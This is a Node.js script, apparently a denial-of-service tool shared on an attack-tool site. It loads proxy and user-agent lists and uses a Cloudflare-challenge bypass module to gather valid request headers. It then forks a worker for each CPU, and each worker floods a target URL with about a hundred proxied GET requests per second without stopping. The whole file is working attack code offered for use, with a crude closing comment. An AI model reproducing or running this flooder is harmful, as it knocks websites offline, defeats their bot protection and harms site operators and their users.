const cluster = require('cluster'); // By b4ckdoorarchive.host
const request = require('request'); // By b4ckdoorarchive.host
const numCPUs = require('os').cpus().length; // By b4ckdoorarchive.host
const chunks = require('array.chunk'); // By b4ckdoorarchive.host

var _ANSI = { 
    Reset: "\x1b[0m",
    Bright: "\x1b[1m",
    Dim: "\x1b[2m",
    Underscore: "\x1b[4m",
    Blink: "\x1b[5m",
    Reverse: "\x1b[7m",
    Hidden: "\x1b[8m",

    FgBlack: "\x1b[30m",
    FgRed: "\x1b[31m",
    FgGreen: "\x1b[32m",
    FgYellow: "\x1b[33m",
    FgBlue: "\x1b[34m",
    FgMagenta: "\x1b[35m",
    FgCyan: "\x1b[36m",
    FgWhite: "\x1b[37m",

    BgBlack: "\x1b[40m",
    BgRed: "\x1b[41m",
    BgGreen: "\x1b[42m",
    BgYellow: "\x1b[43m",
    BgBlue: "\x1b[44m",
    BgMagenta: "\x1b[45m",
    BgCyan: "\x1b[46m",
    BgWhite: "\x1b[47m"
};

var cfb = require('cfbypass');

var fs = require('fs');

function createHandler(_URL, _UA, _PROXY, _CALLBACK) {
    cfb.request({
        method: 'GET',
        url: _URL,
        challengesToSolve: 3, // optional, if CF returns challenge after challenge, how many to solve before failing
        followAllRedirects: true, // mandatory for successful challenge solution
        headers: {
            'User-Agent': _UA
        },
        proxy: _PROXY,
    }, function(err, response, body) {
        if (err) {
            //console.log(err);
            _CALLBACK(false);
        } else {
//            console.log(body);
            _CALLBACK(response.req._headers, _PROXY);
        }
        //body is now a buffer object instead of a string
    });
}



if (cluster.isMaster) {
  masterProcess();
} else {
  childProcess();  
}




function masterProcess() {
  var _URL, _PROXIES_FILE, _UAS_FILE, _TIME, _HANDLERS_COUNT, _HANDLERS, _WORKERS, _WORKER, _PROXIES;
  _WORKERS = [];

  console.log(`Master ${process.pid} is running`);
for (var k in process.argv) {
    if (process.argv[k] == '-h') {
        _URL = process.argv[parseInt(k) + 1];
    }
    if (process.argv[k] == '-c') {
        _HANDLERS_COUNT = parseInt(process.argv[parseInt(k) + 1]);
    }
    if (process.argv[k] == '-u') {
        _UAS_FILE = process.argv[parseInt(k) + 1];
    }
    if (process.argv[k] == '-p') {
        _PROXIES_FILE = process.argv[parseInt(k) + 1];
    }

}

var path = process.cwd();
var buffer = fs.readFileSync(path + "/"+_UAS_FILE);
var text = buffer.toString();
var useragents = text.split("\n");
buffer = fs.readFileSync(path + "/"+_PROXIES_FILE);
text = buffer.toString();
_PROXIES = text.split("\n");


console.log(_ANSI.FgGreen + "Preparing " + _HANDLERS_COUNT + " handlers for " + _URL + _ANSI.Reset);
  var _PROXIES_CHUNKS = chunks(_PROXIES,parseInt(_PROXIES.length/(numCPUs-1)));
  for (let i = 0; i < numCPUs; i++) {
     console.log(`Forking process number ${i}...`);
    _WORKER = cluster.fork();
    _WORKERS.push(_WORKER);
    

  }
  for (var key in _WORKERS){
	_WORKER = _WORKERS[key];
        _WORKER.send({proxies:_PROXIES_CHUNKS[parseInt(key)], URL: _URL, useragents: useragents});

  }


//  process.exit();
}

function childProcess() {
  var _HANDLERS = [];
  process.on('message', function(message) {
	var proxies = message.proxies;
	var useragents = message.useragents;
	var _URL = message.URL;
	for(var i = 0; i < proxies.length; i++){
		var proxy = proxies[i];
		var useragent = useragents[Math.floor(Math.random()*useragents.length)];
		if(proxy !== undefined && proxy !== null){
			console.log(_ANSI.FgGreen + "Preparing handler for proxy "+ proxy+" with UserAgent: "+useragent+ _ANSI.Reset);
			createHandler(_URL, useragent, "http://"+proxy, function(a,b){
				if(a !== false){
					console.log("Handler Started");
					a['Referer'] = _URL;
					_HANDLERS.push({headers: a, proxy: b});
				}
			});
		}
	}

	setInterval(function(){
		if(_HANDLERS.length > 1){
		for (var i = 0; i < 100; i++) {
		    var handler = _HANDLERS[Math.floor(Math.random()*_HANDLERS.length)];
			var options = {
			  url: _URL,
			  headers: handler.headers,
			  proxy: handler.proxy

			};

			
			request.get(options, function(error, response, body) {
				if(body !== undefined){
					if(body.includes("visiting")){
						console.log("200 OK");
					}
				}
			});

	        }
		}
	}, 1000);
  });
}

// B4CKDOOR FUCK ME PLOX
